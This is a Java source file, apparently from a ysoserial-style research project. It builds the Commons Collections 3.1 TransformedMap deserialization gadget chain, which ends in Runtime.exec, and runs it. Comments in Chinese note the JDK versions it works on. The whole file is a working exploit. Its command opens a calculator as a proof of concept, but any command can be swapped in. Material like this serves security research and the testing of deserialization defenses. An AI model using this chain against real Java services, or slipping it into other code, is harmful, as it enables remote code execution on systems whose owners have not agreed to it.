package com.p2hm1n.gadget;

import com.p2hm1n.annotation.Dependencies;
import com.p2hm1n.util.PayloadRunner;
import com.p2hm1n.util.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Retention;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * CommonsCollections1 的 TransformedMap gadget
 * 测试环境 JDK8u45 （大于 Java 8u71 不能触发此条 gadget）
 */
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CCTM1 {
    public static void main(String[] args) throws Exception{
        final String[] execArgs = new String[] { "open -a Calculator" };
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        final HashMap innerMap = new HashMap();
        // 第一个参数必须是 value
        innerMap.put("value", "random");
        final Map transformedMap = TransformedMap.decorate(innerMap, null, transformerChain);
        final InvocationHandler handler = (InvocationHandler) Reflections.newInstance("sun.reflect.annotation.AnnotationInvocationHandler", Retention.class, transformedMap);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
        PayloadRunner.run(handler);

    }
}
